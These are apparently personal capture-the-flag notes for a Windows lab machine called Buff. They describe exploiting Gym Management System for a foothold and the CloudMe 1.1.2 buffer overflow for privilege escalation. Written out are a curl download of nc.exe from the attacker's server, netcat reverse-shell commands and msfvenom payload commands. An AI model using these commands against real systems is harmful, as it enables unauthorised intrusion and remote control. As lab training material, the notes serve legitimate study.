Buff is a Windows machine

* The nmap scan show a web server running on port 8080 

* Found out that the site is built using Gym Management System 
  we can exploit it using https://www.exploit-db.com/exploits/48506

* To upload nc.exe after connecting to the server set up a simple 
http server with python and from the target machine do curl.exe -o nc.exe http://10.10.14.216:8001/nc.exe *

* First upload nc.exe to the server and then use the exploit to 
give the command nc.exe 10.10.14.104 7676 -e cmd.exe AFTER setting
up a listener (For some reason uploading a php shell and connecting from
the browser fails)*

* For previledge excalation it has something to do with CloudMe which had a buffer overflow exploit *

* Found the vulnerable version the box uses it is CloudMe version 1.1.2 and the exploit https://www.exploit-db.com/exploits/48389 *

* We need to create a new payload so we use msfvenom *

  msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.25 LPORT=7676 -b "\x00" -f py -o payload

  Run the CloudMe_1112.exe on the Users/Shaun/Downloads folder
  - ../../../../../Users/Shaun/Downloads/CloudMe_1112.exe

  - netstat -aof | findstr :8888 => to see if port is listening

  - msfvenom -a x86 -p windows/exec CMD="C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.25 7676 -e cmd.exe" -b '\x00\x0A\x0D' -f python


taskkill /F /IM CloudMe_1112.exe
